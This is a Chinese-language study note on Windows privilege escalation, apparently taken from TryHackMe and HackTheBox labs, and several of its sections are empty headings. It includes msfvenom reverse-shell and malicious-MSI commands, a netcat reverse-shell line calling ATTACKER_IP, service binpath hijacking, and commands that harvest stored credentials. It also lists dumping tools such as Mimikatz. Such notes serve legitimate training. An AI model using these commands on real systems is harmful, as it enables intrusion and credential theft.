# windows提权
- [windows提权](#windows提权)
- [理论](#理论)
  - [THM基础](#thm基础)
    - [滥用服务错误配置](#滥用服务错误配置)
    - [滥用危险的特权](#滥用危险的特权)
    - [滥用易受攻击的软件](#滥用易受攻击的软件)
    - [其他提权工具](#其他提权工具)
  - [HTB基础](#htb基础)
    - [工具](#工具)
    - [态势感知](#态势感知)
    - [初始枚举](#初始枚举)
  - [实战](#实战)
    - [命令\&工具](#命令工具)
    - [SAM文件](#sam文件)

# 理论

## THM基础

>反shell

生成反shell:  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.72.135 LPORT=1234 -f exe -o reverse.exe

传到Windows上：    
copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe


>无人值守的 Windows 安装

可能存在的位置： 
``````
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
``````
 作为这些文件的一部分，您可能会遇到凭据：
``````
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
``````
>Powershell 历史

cmd:  
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  
powershell:  
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt   

>保存的 Windows 凭据

cmdkey /list

runas /savecred /user:admin cmd.exe
>IIS 配置

我们可以在以下位置之一找到 web.config：  
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

这是在文件上查找数据库连接字符串的快速方法：  
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
>从软件检索凭证：PuTTY

要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：

reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

>计划任务

查看目标系统上的计划任务，您可能会看到计划任务丢失了其二进制文件或正在使用您可以修改的二进制文件。

schtasks 可以使用不带任何选项的命令从命令行列出计划任务 。要检索有关任何服务的详细信息，您可以使用如下命令：
``````
命令提示符
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
``````
您将获得有关该任务的大量信息，但对我们来说重要的是“要运行的任务”参数，该参数指示计划任务执行的内容，以及“以用户身份运行”参数，该参数显示将使用的用户执行任务。

如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的文件权限，我们使用icacls：
``````
命令提示符
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
``````
从结果中可以看出，BUILTIN\Users组对任务的二进制文件具有完全访问权限 (F)。这意味着我们可以修改 .bat 文件并插入我们喜欢的任何有效负载。为了您的方便，nc64.exe可以在 上找到C:\tools。让我们更改 bat 文件以生成反向 shell：
``````
命令提示符
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
``````
然后，我们在攻击者机器上启动一个侦听器，该侦听器位于我们在反向 shell 上指示的同一端口上：  
``````
nc -lvp 4444
``````
下次运行计划任务时，您应该会收到具有taskusr1权限的反向shell。虽然您可能无法在实际场景中启动任务，而必须等待计划任务触发，但我们为您的用户提供了手动启动任务的权限，以节省您的时间。我们可以使用以下命令运行该任务：
``````
命令提示符
C:\> schtasks /run /tn vulntask
``````

您将按预期收到具有taskusr1权限的反向shell：  
``````
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
``````

>始终安装提升

Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。

注意： AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。

此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。
``````
命令提示符
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
``````
为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用 生成恶意 .msi 文件 msfvenom，如下所示：
``````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
``````
由于这是一个反向 shell，您还应该运行相应配置的Metasploit处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：
``````
命令提示符
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
``````


### 滥用服务错误配置



### 滥用危险的特权

### 滥用易受攻击的软件

### 其他提权工具

>WinPEAS

>PrivescCheck

>WES-NG



>Metasploit

如果目标系统上已有 Meterpreter shell，则可以使用该multi/recon/local_exploit_suggester模块列出可能影响目标系统的漏洞，并允许您提升目标系统上的权限。

## HTB基础

Windows 系统存在巨大的攻击面。我们可以提升权限的一些方法包括：

- 滥用 Windows 组权限	
- 滥用 Windows 用户权限
- 绕过用户帐户控制	
- 滥用弱服务/文件权限
- 利用未修补的内核漏洞	
- 凭据盗窃
- 流量捕获	

### 工具

下面是HTBA提供的工具：
- Seatbelt	 
- winPEAS	
- PowerUp	
- SharpUp	
- JAWS	
- SessionGopher	
- Watson	
- LaZagne	
- Windows Exploit Suggester - Next Generation
- Sysinternals Suite

### 态势感知

**网络信息**

接口、IP 地址、DNS 信息:
```
ipconfig /all
```

arp表：
```
arp -a
```

路由表：
```
route print
```

检查 Windows Defender 状态:
```powershell
Get-MpComputerStatus
```

列出 AppLocker 规则:
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

测试 AppLocker 策略：
```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

### 初始枚举




## 实战

### 命令&工具



查询服务：  
sc qc <服务名称>

修改服务配置并将 BINARY_PATH_NAME (binpath) 设置为您创建的reverse.exe可执行文件：  
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""

>启动服务

net start <服务名称>

>accesschk.exe

accesschk.exe 检查某个账户对某个服务的权限

栗子：  

使用 accesschk.exe 检查“user”帐户对“daclsvc”服务的权限：  
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc

C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"

C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1


>

### SAM文件

检索SAM文件工具：  
pwdumpx.exe
gsecdump
Mimikatz
secretsdump.py

